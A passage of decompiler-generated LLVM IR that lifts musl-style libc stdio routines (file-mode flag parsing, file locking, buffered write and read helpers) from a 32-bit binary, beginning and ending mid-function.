  %v1_8050cc4 = ptrtoint i8* %v0_8050cc4 to i32
  %v2_8050cc4 = add i32 %v1_8050cc4, 40
  %v3_8050cc4 = inttoptr i32 %v2_8050cc4 to i32*
  store i32 134534528, i32* %v3_8050cc4, align 4
  %v0_8050ccb = load i8*, i8** %tmp, align 4
  %v1_8050ccb = ptrtoint i8* %v0_8050ccb to i32
  %v2_8050ccb = add i32 %v1_8050ccb, 12
  %v3_8050ccb = inttoptr i32 %v2_8050ccb to i32*
  store i32 134534333, i32* %v3_8050ccb, align 4
  %v1_8050cd2 = icmp eq i1 %v1_8050caf, false
  br i1 %v1_8050cd2, label %dec_label_pc_8050cdb, label %dec_label_pc_8050cd4

dec_label_pc_8050cd4:                             ; preds = %dec_label_pc_8050caf
  %v0_8050cd4 = load i8*, i8** %tmp, align 4
  %v1_8050cd4 = ptrtoint i8* %v0_8050cd4 to i32
  %v2_8050cd4 = add i32 %v1_8050cd4, 76
  %v3_8050cd4 = inttoptr i32 %v2_8050cd4 to i32*
  store i32 -1, i32* %v3_8050cd4, align 4
  br label %dec_label_pc_8050cdb

dec_label_pc_8050cdb:                             ; preds = %dec_label_pc_8050caf, %dec_label_pc_8050cd4
  %v0_8050cdb = load i32, i32* @esp, align 4
  %v9_8050cdb = icmp eq i32 %v0_8050cdb, 12
  store i1 %v9_8050cdb, i1* %zf.global-to-local, align 1
  %v0_8050cde2 = load i32, i32* %tmp19, align 4
  store i32 %v0_8050cde2, i32* %tmp20, align 4
  %v2_8050cdf = call i32 @__ofl_add(i32 %v0_8050cde2)
  %v0_8050ce4 = load i32, i32* @esp, align 4
  %v6_8050ce4 = icmp eq i32 %v0_8050ce4, -16
  store i1 %v6_8050ce4, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8050ce7

dec_label_pc_8050ce7:                             ; preds = %dec_label_pc_8050bc9, %dec_label_pc_8050bb7, %dec_label_pc_8050cdb
  %v0_8050ced = phi i32 [ 0, %dec_label_pc_8050bc9 ], [ 0, %dec_label_pc_8050bb7 ], [ %v2_8050cdf, %dec_label_pc_8050cdb ]
  %v0_8050ce7 = phi i32 [ %v12_8050bb0, %dec_label_pc_8050bc9 ], [ %v0_8050ce7.pre, %dec_label_pc_8050bb7 ], [ %v12_8050bb0, %dec_label_pc_8050cdb ]
  %v6_8050ce7 = icmp eq i32 %v0_8050ce7, -32
  store i1 %v6_8050ce7, i1* %zf.global-to-local, align 1
  %v2_8050cea = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050cea, i32* @ebx, align 4
  store i32 %v0_8050b98, i32* @edi, align 4
  ret i32 %v0_8050ced

; uselistorder directives
  uselistorder i8* %v1_8050c81, { 1, 0 }
  uselistorder i32 %v2_8050c53, { 2, 1, 0 }
  uselistorder i1 %v11_8050c3e, { 1, 0 }
  uselistorder i1 %v11_8050c06, { 1, 0 }
  uselistorder i1 %v2_8050bdd, { 1, 0 }
  uselistorder i32 %v2_8050bd1, { 0, 2, 1, 3, 4 }
  uselistorder i8** %stack_var_-60, { 8, 9, 6, 7, 4, 3, 0, 2, 5, 1 }
  uselistorder i8** %tmp, { 3, 10, 8, 11, 7, 12, 6, 5, 9, 4, 0, 1, 2 }
  uselistorder i8 10, { 6, 0, 1, 2, 7, 3, 4, 5 }
  uselistorder i32 1024, { 7, 8, 5, 3, 0, 1, 6, 2, 4 }
  uselistorder i32 22, { 4, 6, 3, 2, 8, 0, 5, 9, 10, 11, 1, 7 }
  uselistorder [4 x i8]* @global_var_80545b8.369, { 1, 0 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050ce7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050cdb, { 1, 0 }
  uselistorder label %dec_label_pc_8050caf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050c74, { 1, 0 }
  uselistorder label %dec_label_pc_8050c6e, { 1, 0 }
  uselistorder label %dec_label_pc_8050c3e, { 1, 0 }
  uselistorder label %dec_label_pc_8050c15, { 1, 0 }
}

define i32 @__fmodeflags() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  %v0_8050cf1 = load i32, i32* @ebx, align 4
  store i32 %v0_8050cf1, i32* %stack_var_-8, align 4
  store i32 2, i32* @ebx, align 4
  %v4_8050cfa = ptrtoint i8* %tmp to i32
  store i32 %v4_8050cfa, i32* @esi, align 4
  %v4_8050d01 = call i32 @strchr(i32 %v4_8050cfa, i8 43)
  %v1_8050d09 = icmp eq i32 %v4_8050d01, 0
  %v1_8050d0b = icmp eq i1 %v1_8050d09, false
  br i1 %v1_8050d0b, label %entry.dec_label_pc_8050d15_crit_edge, label %dec_label_pc_8050d0d

entry.dec_label_pc_8050d15_crit_edge:             ; preds = %entry
  %v0_8050d19.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050d15

dec_label_pc_8050d0d:                             ; preds = %entry
  %v0_8050d0f = load i32, i32* @esi, align 4
  %v1_8050d0f = inttoptr i32 %v0_8050d0f to i8*
  %v2_8050d0f = load i8, i8* %v1_8050d0f, align 1
  %v11_8050d0f = icmp eq i8 %v2_8050d0f, 114
  %v1_8050d12 = icmp eq i1 %v11_8050d0f, false
  %v2_8050d12 = zext i1 %v1_8050d12 to i32
  store i32 %v2_8050d12, i32* @ebx, align 4
  br label %dec_label_pc_8050d15

dec_label_pc_8050d15:                             ; preds = %entry.dec_label_pc_8050d15_crit_edge, %dec_label_pc_8050d0d
  %v0_8050d19 = phi i32 [ %v0_8050d19.pre, %entry.dec_label_pc_8050d15_crit_edge ], [ %v0_8050d0f, %dec_label_pc_8050d0d ]
  %v4_8050d1a = call i32 @strchr(i32 %v0_8050d19, i8 120)
  %v1_8050d22 = icmp eq i32 %v4_8050d1a, 0
  br i1 %v1_8050d22, label %dec_label_pc_8050d29, label %dec_label_pc_8050d26

dec_label_pc_8050d26:                             ; preds = %dec_label_pc_8050d15
  %v0_8050d26 = load i32, i32* @ebx, align 4
  %v9_8050d26 = or i32 %v0_8050d26, 128
  store i32 %v9_8050d26, i32* @ebx, align 4
  br label %dec_label_pc_8050d29

dec_label_pc_8050d29:                             ; preds = %dec_label_pc_8050d15, %dec_label_pc_8050d26
  %v0_8050d2d = load i32, i32* @esi, align 4
  %v4_8050d2e = call i32 @strchr(i32 %v0_8050d2d, i8 101)
  %v1_8050d36 = icmp eq i32 %v4_8050d2e, 0
  %v0_8050d59.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8050d36, label %dec_label_pc_8050d40, label %dec_label_pc_8050d3a

dec_label_pc_8050d3a:                             ; preds = %dec_label_pc_8050d29
  %v1_8050d3a = or i32 %v0_8050d59.pre.pre, 524288
  br label %dec_label_pc_8050d40

dec_label_pc_8050d40:                             ; preds = %dec_label_pc_8050d29, %dec_label_pc_8050d3a
  %v0_8050d59.pre = phi i32 [ %v1_8050d3a, %dec_label_pc_8050d3a ], [ %v0_8050d59.pre.pre, %dec_label_pc_8050d29 ]
  %v0_8050d40 = load i32, i32* @esi, align 4
  %v1_8050d40 = inttoptr i32 %v0_8050d40 to i8*
  %v2_8050d40 = load i8, i8* %v1_8050d40, align 1
  %v10_8050d42 = icmp eq i8 %v2_8050d40, 114
  br i1 %v10_8050d42, label %dec_label_pc_8050d59, label %dec_label_pc_8050d46

dec_label_pc_8050d46:                             ; preds = %dec_label_pc_8050d40
  %v1_8050d46 = or i32 %v0_8050d59.pre, 64
  %v10_8050d49 = icmp eq i8 %v2_8050d40, 119
  %v1_8050d4b = icmp eq i1 %v10_8050d49, false
  br i1 %v1_8050d4b, label %dec_label_pc_8050d52, label %dec_label_pc_8050d4d

dec_label_pc_8050d4d:                             ; preds = %dec_label_pc_8050d46
  %v1_8050d4d = udiv i32 %v0_8050d59.pre, 256
  %v3_8050d4d = and i32 %v1_8050d4d, 253
  %v8_8050d4d = or i32 %v3_8050d4d, 2
  %v10_8050d4d = mul nuw nsw i32 %v8_8050d4d, 256
  %v11_8050d4d = and i32 %v1_8050d46, -65281
  %v12_8050d4d = or i32 %v10_8050d4d, %v11_8050d4d
  br label %dec_label_pc_8050d59

dec_label_pc_8050d52:                             ; preds = %dec_label_pc_8050d46
  %v10_8050d52 = icmp eq i8 %v2_8050d40, 97
  %v1_8050d54 = icmp eq i1 %v10_8050d52, false
  br i1 %v1_8050d54, label %dec_label_pc_8050d59, label %dec_label_pc_8050d56

dec_label_pc_8050d56:                             ; preds = %dec_label_pc_8050d52
  %v1_8050d56 = udiv i32 %v0_8050d59.pre, 256
  %v3_8050d56 = and i32 %v1_8050d56, 251
  %v8_8050d56 = or i32 %v3_8050d56, 4
  %v10_8050d56 = mul nuw nsw i32 %v8_8050d56, 256
  %v11_8050d56 = and i32 %v1_8050d46, -65281
  %v12_8050d56 = or i32 %v10_8050d56, %v11_8050d56
  br label %dec_label_pc_8050d59

dec_label_pc_8050d59:                             ; preds = %dec_label_pc_8050d40, %dec_label_pc_8050d52, %dec_label_pc_8050d4d, %dec_label_pc_8050d56
  %v0_8050d59 = phi i32 [ %v1_8050d46, %dec_label_pc_8050d52 ], [ %v12_8050d4d, %dec_label_pc_8050d4d ], [ %v12_8050d56, %dec_label_pc_8050d56 ], [ %v0_8050d59.pre, %dec_label_pc_8050d40 ]
  %v2_8050d5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050d5c, i32* @ebx, align 4
  ret i32 %v0_8050d59

; uselistorder directives
  uselistorder i32 %v0_8050d59.pre, { 3, 0, 1, 2 }
  uselistorder i32 (i32, i8)* @strchr, { 0, 1, 2, 3, 4, 5, 7, 8, 6, 9 }
  uselistorder i8 43, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050d59, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8050d40, { 1, 0 }
  uselistorder label %dec_label_pc_8050d29, { 1, 0 }
  uselistorder label %dec_label_pc_8050d15, { 1, 0 }
}

define i32 @__unlockfile(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050d60 = load i32, i32* @edi, align 4
  store i32 0, i32* @edx, align 4
  %v0_8050d64 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v2_8050d6c = add i32 %arg1, 76
  %v3_8050d6c = inttoptr i32 %v2_8050d6c to i32*
  store i32 0, i32* %v3_8050d6c, align 4
  %v2_8050d6f = load i32, i32* %stack_var_-16, align 4
  %v0_8050d74 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d74 = add i32 %v0_8050d74, 76
  store i32 %v1_8050d74, i32* @ebx, align 4
  %v1_8050d77 = add i32 %v0_8050d74, 80
  %v2_8050d77 = inttoptr i32 %v1_8050d77 to i32*
  %v3_8050d77 = load i32, i32* %v2_8050d77, align 4
  store i32 %v3_8050d77, i32* %eax.global-to-local, align 4
  %v1_8050d7a = icmp eq i32 %v3_8050d77, 0
  br i1 %v1_8050d7a, label %dec_label_pc_8050da4, label %dec_label_pc_8050d7e

dec_label_pc_8050d7e:                             ; preds = %entry
  store i32 240, i32* %esi.global-to-local, align 4
  store i32 129, i32* @ecx, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  store i32 %v1_8050d74, i32* @edx, align 4
  %v1_8050d91 = call i32 @__vsyscall(i32 %v2_8050d6f)
  store i32 %v1_8050d91, i32* %eax.global-to-local, align 4
  %v10_8050d96 = icmp eq i32 %v1_8050d91, -38
  %v1_8050d99 = icmp eq i1 %v10_8050d96, false
  br i1 %v1_8050d99, label %dec_label_pc_8050da4, label %dec_label_pc_8050d9b

dec_label_pc_8050d9b:                             ; preds = %dec_label_pc_8050d7e
  %v0_8050d9b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050d9b, i32* @eax, align 4
  %v0_8050d9d = load i32, i32* @edi, align 4
  store i32 %v0_8050d9d, i32* @ecx, align 4
  %v0_8050d9f = load i32, i32* %stack_var_-16, align 4
  %v1_8050d9f = call i32 @__vsyscall(i32 %v0_8050d9f)
  store i32 %v1_8050d9f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050da4

dec_label_pc_8050da4:                             ; preds = %dec_label_pc_8050d7e, %entry, %dec_label_pc_8050d9b
  %v2_8050da4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050da4, i32* %eax.global-to-local, align 4
  store i32 %v0_8050d64, i32* @ebx, align 4
  store i32 %v0_8050d60, i32* @edi, align 4
  ret i32 %v2_8050da4

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32 129, { 11, 0, 1, 2, 3, 4, 5, 9, 10, 6, 7, 8 }
  uselistorder i32 240, { 0, 27, 28, 29, 1, 14, 2, 15, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 25, 9, 26, 10, 21, 11, 22, 12, 23, 13, 24 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050da4, { 2, 0, 1 }
}

define i32 @__lockfile(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @esi, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @__stdio_write(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  store i32 %tmp15, i32* %esi.global-to-local, align 4
  %v2_8050e03 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050e03, i32* @ebx, align 4
  store i32 %arg3, i32* %ebp.global-to-local, align 4
  %v1_8050e13 = add i32 %tmp15, 28
  %v2_8050e13 = inttoptr i32 %v1_8050e13 to i32*
  %v3_8050e13 = load i32, i32* %v2_8050e13, align 4
  store i32 %v3_8050e13, i32* %eax.global-to-local, align 4
  %v1_8050e16 = add i32 %tmp15, 20
  %v2_8050e16 = inttoptr i32 %v1_8050e16 to i32*
  %v3_8050e16 = load i32, i32* %v2_8050e16, align 4
  store i32 %v3_8050e13, i32* %stack_var_-32, align 4
  %v2_8050e21 = sub i32 %v3_8050e16, %v3_8050e13
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8050e2b = add i32 %v2_8050e21, %arg3
  store i32 %v2_8050e2b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050e35

dec_label_pc_8050e35:                             ; preds = %dec_label_pc_8050eac, %entry
  %v0_8050e3a = phi i32 [ %tmp15, %entry ], [ %v0_8050e3a.pre, %dec_label_pc_8050eac ]
  %stack_var_-40.0 = phi i32 [ %v2_8050e2b, %entry ], [ %v5_8050eac, %dec_label_pc_8050eac ]
  %stack_var_-36.0 = phi i32 [ 2, %entry ], [ %stack_var_-36.1, %dec_label_pc_8050eac ]
  store i32 146, i32* @eax, align 4
  %v1_8050e3a = add i32 %v0_8050e3a, 60
  %v2_8050e3a = inttoptr i32 %v1_8050e3a to i32*
  %v3_8050e3a = load i32, i32* %v2_8050e3a, align 4
  store i32 %v3_8050e3a, i32* @edx, align 4
  store i32 %stack_var_-36.0, i32* @edi, align 4
  %v1_8050e43 = call i32 @__vsyscall(i32 %arg2)
  store i32 %v1_8050e43, i32* %eax.global-to-local, align 4
  %v1_8050e4c = call i32 @__syscall_ret(i32 %v1_8050e43)
  store i32 %v1_8050e4c, i32* %eax.global-to-local, align 4
  %v15_8050e54 = icmp eq i32 %stack_var_-40.0, %v1_8050e4c
  %v1_8050e58 = icmp eq i1 %v15_8050e54, false
  br i1 %v1_8050e58, label %dec_label_pc_8050e6e, label %dec_label_pc_8050e5a

dec_label_pc_8050e5a:                             ; preds = %dec_label_pc_8050e35
  %v0_8050e5a = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e5a = add i32 %v0_8050e5a, 48
  %v2_8050e5a = inttoptr i32 %v1_8050e5a to i32*
  %v3_8050e5a = load i32, i32* %v2_8050e5a, align 4
  store i32 %v3_8050e5a, i32* %eax.global-to-local, align 4
  %v2_8050e5d = add i32 %v0_8050e5a, 44
  %v3_8050e5d = inttoptr i32 %v2_8050e5d to i32*
  %v4_8050e5d = load i32, i32* %v3_8050e5d, align 4
  %v5_8050e5d = add i32 %v4_8050e5d, %v3_8050e5a
  store i32 %v5_8050e5d, i32* %eax.global-to-local, align 4
  %v2_8050e60 = add i32 %v0_8050e5a, 16
  %v3_8050e60 = inttoptr i32 %v2_8050e60 to i32*
  store i32 %v5_8050e5d, i32* %v3_8050e60, align 4
  %v0_8050e63 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e63 = add i32 %v0_8050e63, 44
  %v2_8050e63 = inttoptr i32 %v1_8050e63 to i32*
  %v3_8050e63 = load i32, i32* %v2_8050e63, align 4
  store i32 %v3_8050e63, i32* %eax.global-to-local, align 4
  %v2_8050e66 = add i32 %v0_8050e63, 28
  %v3_8050e66 = inttoptr i32 %v2_8050e66 to i32*
  store i32 %v3_8050e63, i32* %v3_8050e66, align 4
  %v0_8050e69 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e69 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050e69 = add i32 %v1_8050e69, 20
  %v3_8050e69 = inttoptr i32 %v2_8050e69 to i32*
  store i32 %v0_8050e69, i32* %v3_8050e69, align 4
  %v0_8050ebd.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050eba

dec_label_pc_8050e6e:                             ; preds = %dec_label_pc_8050e35
  %v2_8050e6e = icmp slt i32 %v1_8050e4c, 0
  %v1_8050e70 = icmp eq i1 %v2_8050e6e, false
  br i1 %v1_8050e70, label %dec_label_pc_8050e9a, label %dec_label_pc_8050e72

dec_label_pc_8050e72:                             ; preds = %dec_label_pc_8050e6e
  %v0_8050e72 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e72 = inttoptr i32 %v0_8050e72 to i32*
  %v2_8050e72 = load i32, i32* %v1_8050e72, align 4
  %v3_8050e72 = or i32 %v2_8050e72, 32
  store i32 %v3_8050e72, i32* %v1_8050e72, align 4
  %v12_8050e75 = icmp eq i32 %stack_var_-36.0, 2
  %v0_8050e7a = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e7a = add i32 %v0_8050e7a, 16
  %v2_8050e7a = inttoptr i32 %v1_8050e7a to i32*
  store i32 0, i32* %v2_8050e7a, align 4
  %v0_8050e81 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e81 = add i32 %v0_8050e81, 28
  %v2_8050e81 = inttoptr i32 %v1_8050e81 to i32*
  store i32 0, i32* %v2_8050e81, align 4
  %v0_8050e88 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e88 = add i32 %v0_8050e88, 20
  %v2_8050e88 = inttoptr i32 %v1_8050e88 to i32*
  store i32 0, i32* %v2_8050e88, align 4
  %v1_8050e8f = icmp eq i1 %v12_8050e75, false
  br i1 %v1_8050e8f, label %dec_label_pc_8050e95, label %dec_label_pc_8050e91

dec_label_pc_8050e91:                             ; preds = %dec_label_pc_8050e72
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050eba

dec_label_pc_8050e95:                             ; preds = %dec_label_pc_8050e72
  %v0_8050e95 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050e95 = load i32, i32* @ebx, align 4
  %v2_8050e95 = add i32 %v1_8050e95, 4
  %v3_8050e95 = inttoptr i32 %v2_8050e95 to i32*
  %v4_8050e95 = load i32, i32* %v3_8050e95, align 4
  %v5_8050e95 = sub i32 %v0_8050e95, %v4_8050e95
  store i32 %v5_8050e95, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050eba

dec_label_pc_8050e9a:                             ; preds = %dec_label_pc_8050e6e
  %v0_8050e9a = load i32, i32* @ebx, align 4
  %v1_8050e9a = add i32 %v0_8050e9a, 4
  %v2_8050e9a = inttoptr i32 %v1_8050e9a to i32*
  %v3_8050e9a = load i32, i32* %v2_8050e9a, align 4
  store i32 %v1_8050e4c, i32* %edx.global-to-local, align 4
  %v2_8050e9f = sub i32 %v1_8050e4c, %v3_8050e9a
  %v7_8050e9f = icmp ult i32 %v1_8050e4c, %v3_8050e9a
  %v12_8050e9f = icmp eq i32 %v2_8050e9f, 0
  %v2_8050ea1 = or i1 %v7_8050e9f, %v12_8050e9f
  br i1 %v2_8050ea1, label %dec_label_pc_8050eac, label %dec_label_pc_8050ea3

dec_label_pc_8050ea3:                             ; preds = %dec_label_pc_8050e9a
  %v4_8050ea3 = add i32 %stack_var_-36.0, -1
  store i32 %v2_8050e9f, i32* %edx.global-to-local, align 4
  %v1_8050ea9 = add i32 %v0_8050e9a, 8
  store i32 %v1_8050ea9, i32* @ebx, align 4
  br label %dec_label_pc_8050eac

dec_label_pc_8050eac:                             ; preds = %dec_label_pc_8050e9a, %dec_label_pc_8050ea3
  %v3_8050eb0 = phi i32 [ %v1_8050e4c, %dec_label_pc_8050e9a ], [ %v2_8050e9f, %dec_label_pc_8050ea3 ]
  %v20_8050eb0 = phi i32 [ %v0_8050e9a, %dec_label_pc_8050e9a ], [ %v1_8050ea9, %dec_label_pc_8050ea3 ]
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_8050e9a ], [ %v4_8050ea3, %dec_label_pc_8050ea3 ]
  %v5_8050eac = sub i32 %stack_var_-40.0, %v1_8050e4c
  %v1_8050eb0 = inttoptr i32 %v20_8050eb0 to i32*
  %v2_8050eb0 = load i32, i32* %v1_8050eb0, align 4
  %v4_8050eb0 = add i32 %v2_8050eb0, %v3_8050eb0
  store i32 %v4_8050eb0, i32* %v1_8050eb0, align 4
  %v0_8050eb2 = load i32, i32* @ebx, align 4
  %v1_8050eb2 = add i32 %v0_8050eb2, 4
  %v2_8050eb2 = inttoptr i32 %v1_8050eb2 to i32*
  %v3_8050eb2 = load i32, i32* %v2_8050eb2, align 4
  %v4_8050eb2 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050eb2 = sub i32 %v3_8050eb2, %v4_8050eb2
  store i32 %v5_8050eb2, i32* %v2_8050eb2, align 4
  %v0_8050e3a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050e35

dec_label_pc_8050eba:                             ; preds = %dec_label_pc_8050e95, %dec_label_pc_8050e91, %dec_label_pc_8050e5a
  %v0_8050ebd = phi i32 [ %v5_8050e95, %dec_label_pc_8050e95 ], [ 0, %dec_label_pc_8050e91 ], [ %v0_8050ebd.pre, %dec_label_pc_8050e5a ]
  store i32 %v0_8050ebd, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050ebd

; uselistorder directives
  uselistorder i32 %v0_8050ebd, { 1, 0 }
  uselistorder i32 %v3_8050e9a, { 1, 0 }
  uselistorder i32 %v1_8050e4c, { 5, 1, 3, 4, 2, 6, 0, 7 }
  uselistorder i32 %stack_var_-36.0, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %tmp15, { 0, 1, 3, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ebp.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7 }
  uselistorder label %dec_label_pc_8050eac, { 1, 0 }
}

define i32 @__towrite(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 %tmp1, i32* @ecx, align 4
  %v1_8050ec8 = add i32 %tmp1, 74
  %v2_8050ec8 = inttoptr i32 %v1_8050ec8 to i8*
  %v3_8050ec8 = load i8, i8* %v2_8050ec8, align 1
  %v4_8050ec8 = zext i8 %v3_8050ec8 to i32
  %v5_8050ec8 = load i32, i32* @edx, align 4
  %v6_8050ec8 = and i32 %v5_8050ec8, -256
  %v7_8050ec8 = or i32 %v6_8050ec8, %v4_8050ec8
  store i32 %v7_8050ec8, i32* @edx, align 4
  %v1_8050ecb = add i32 %v7_8050ec8, -1
  %v2_8050ece = or i32 %v1_8050ecb, %v7_8050ec8
  %v5_8050ece = trunc i32 %v2_8050ece to i8
  store i32 %v2_8050ece, i32* %eax.global-to-local, align 4
  store i8 %v5_8050ece, i8* %v2_8050ec8, align 1
  %v0_8050ed3 = load i32, i32* @ecx, align 4
  %v1_8050ed3 = inttoptr i32 %v0_8050ed3 to i32*
  %v2_8050ed3 = load i32, i32* %v1_8050ed3, align 4
  store i32 %v2_8050ed3, i32* %eax.global-to-local, align 4
  %v2_8050ed5 = and i32 %v2_8050ed3, 8
  %v3_8050ed5 = icmp eq i32 %v2_8050ed5, 0
  br i1 %v3_8050ed5, label %dec_label_pc_8050ee2, label %dec_label_pc_8050ed9

dec_label_pc_8050ed9:                             ; preds = %entry
  %v1_8050ed9 = or i32 %v2_8050ed3, 32
  store i32 %v1_8050ed9, i32* %v1_8050ed3, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  ret i32 -1

dec_label_pc_8050ee2:                             ; preds = %entry
  %v1_8050ee2 = add i32 %v0_8050ed3, 44
  %v2_8050ee2 = inttoptr i32 %v1_8050ee2 to i32*
  %v3_8050ee2 = load i32, i32* %v2_8050ee2, align 4
  store i32 %v3_8050ee2, i32* %eax.global-to-local, align 4
  %v1_8050ee5 = add i32 %v0_8050ed3, 8
  %v2_8050ee5 = inttoptr i32 %v1_8050ee5 to i32*
  store i32 0, i32* %v2_8050ee5, align 4
  %v0_8050eec = load i32, i32* @ecx, align 4
  %v1_8050eec = add i32 %v0_8050eec, 4
  %v2_8050eec = inttoptr i32 %v1_8050eec to i32*
  store i32 0, i32* %v2_8050eec, align 4
  %v0_8050ef3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ef3 = load i32, i32* @ecx, align 4
  %v2_8050ef3 = add i32 %v1_8050ef3, 28
  %v3_8050ef3 = inttoptr i32 %v2_8050ef3 to i32*
  store i32 %v0_8050ef3, i32* %v3_8050ef3, align 4
  %v0_8050ef6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ef6 = load i32, i32* @ecx, align 4
  %v2_8050ef6 = add i32 %v1_8050ef6, 20
  %v3_8050ef6 = inttoptr i32 %v2_8050ef6 to i32*
  store i32 %v0_8050ef6, i32* %v3_8050ef6, align 4
  %v0_8050ef9 = load i32, i32* @ecx, align 4
  %v1_8050ef9 = add i32 %v0_8050ef9, 48
  %v2_8050ef9 = inttoptr i32 %v1_8050ef9 to i32*
  %v3_8050ef9 = load i32, i32* %v2_8050ef9, align 4
  store i32 %v3_8050ef9, i32* %eax.global-to-local, align 4
  %v2_8050efc = add i32 %v0_8050ef9, 44
  %v3_8050efc = inttoptr i32 %v2_8050efc to i32*
  %v4_8050efc = load i32, i32* %v3_8050efc, align 4
  %v5_8050efc = add i32 %v4_8050efc, %v3_8050ef9
  %v2_8050eff = add i32 %v0_8050ef9, 16
  %v3_8050eff = inttoptr i32 %v2_8050eff to i32*
  store i32 %v5_8050efc, i32* %v3_8050eff, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8050ed3, { 1, 0, 2 }
}

define i32 @__towrite_needs_stdio_exit() local_unnamed_addr {
entry:
  %v0_8050f05 = call i32 @__stdio_exit()
  ret i32 %v0_8050f05
}

define i32 @__uflow(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8050f0c = load i32, i32* @ebx, align 4
  store i32 %v0_8050f0c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050f15 = inttoptr i32 %arg1 to i32*
  %v2_8050f15 = call i32 @__toread(i32* %v1_8050f15)
  %v1_8050f1d = icmp eq i32 %v2_8050f15, 0
  %v1_8050f1f = icmp eq i1 %v1_8050f1d, false
  br i1 %v1_8050f1f, label %dec_label_pc_8050f3a, label %dec_label_pc_8050f21

dec_label_pc_8050f21:                             ; preds = %entry
  %v0_8050f29 = load i32, i32* @ebx, align 4
  %v5_8050f2a = add i32 %v0_8050f29, 32
  %v6_8050f2a = inttoptr i32 %v5_8050f2a to i32*
  %v7_8050f2a = load i32, i32* %v6_8050f2a, align 4
  call void @__pseudo_call(i32 %v7_8050f2a)
  br i1 true, label %dec_label_pc_8050f3a, label %dec_label_pc_8050f33

dec_label_pc_8050f33:                             ; preds = %dec_label_pc_8050f21
  br label %dec_label_pc_8050f3d

dec_label_pc_8050f3a:                             ; preds = %dec_label_pc_8050f21, %entry
  br label %dec_label_pc_8050f3d

dec_label_pc_8050f3d:                             ; preds = %dec_label_pc_8050f33, %dec_label_pc_8050f3a
  %v2_8050f40 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050f40, i32* @ebx, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050f3d, { 1, 0 }
}

define i32 @__ofl_add(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8050f44 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050f4c = call i32 @__ofl_lock(i32 %v0_8050f44)
  store i32 %v1_8050f4c, i32* %edx.global-to-local, align 4
